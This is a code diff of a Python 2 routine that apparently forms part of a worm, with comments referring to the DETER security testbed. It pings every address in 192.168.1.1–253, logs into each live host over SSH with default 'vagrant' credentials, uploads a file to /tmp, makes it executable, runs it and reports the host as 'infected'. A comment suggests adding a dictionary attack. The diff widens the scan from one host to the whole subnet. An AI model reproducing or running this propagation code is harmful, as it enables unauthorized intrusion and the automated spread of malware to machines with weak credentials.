@@ -15,28 +15,30 @@ def run(**args):
         else:
             pingstatus = 0
         return pingstatus
-
-    hostname = "192.168.1."
     #   For DETER need to change to local address!!!!
-    #   Change range to (255)
-    for i in range(120,121,1):
-        res = pinger(hostname) #+ str(i))
+    hostname = "192.168.1."
+
+    for i in range(1,254,1):
+        res = pinger(hostname + str(i))
         if res == 1:
-            myList.append(hostname ) #+ str(i))
-    for index,ipAddr in enumerate(myList):
-        print "[+] Attacking Host : %s " %ipAddr
-        ssh = paramiko.SSHClient()
-        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-        try:
-            ssh.connect(ipAddr, username="vagrant", password="vagrant")
-            sftpClient = ssh.open_sftp()
-            test = sftpClient.put("../" + fileName, "/tmp/" + fileName)
-            test = ssh.exec_command("chmod +x /tmp/" + fileName)
-            print "[+] " + ipAddr + " infected."
-            stdin,stdout,stderr = ssh.exec_command("/tmp/" +fileName)
-            print "stderr: ", stderr.readlines()
-            ssh.exec_command("\n")
-        except paramiko.AuthenticationException:
-            print "[-] Failed! ..."
+            myList.append(hostname + str(i))
+    if myList:
+        for index,ipAddr in enumerate(myList):
+            print "[+] Attacking Host : %s " %ipAddr
+            ssh = paramiko.SSHClient()
+            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+            try:
+                # REMOVE username & password for DETER
+                # loop Dictionary attack if un & pw are needed
+                ssh.connect(ipAddr, username="vagrant", password="vagrant")
+                sftpClient = ssh.open_sftp()
+                test = sftpClient.put("../" + fileName, "/tmp/" + fileName)
+                test = ssh.exec_command("chmod +x /tmp/" + fileName)
+                print "[+] " + ipAddr + " infected."
+                stdin,stdout,stderr = ssh.exec_command("/tmp/" +fileName)
+                print "stderr: ", stderr.readlines()
+                ssh.exec_command("\n")
+            except paramiko.AuthenticationException:
+                print "[-] Failed! ..."
 
     return None
